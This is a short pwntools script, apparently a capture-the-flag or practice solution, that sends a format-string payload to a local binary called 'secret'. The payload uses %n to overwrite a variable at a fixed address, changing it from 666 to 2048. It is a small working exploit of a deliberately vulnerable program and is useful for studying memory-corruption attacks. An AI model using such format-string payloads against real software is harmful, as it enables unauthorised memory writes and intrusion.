#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
p = process('secret')
secret = 0x804a028
# change secret@0x804a028 666 -> 2048
payload = p32(secret) + "%08x.%08x.%08x.%08x.%08x.%01998x.%n"
p.sendline(payload)
print p.read().split('.')[-1]
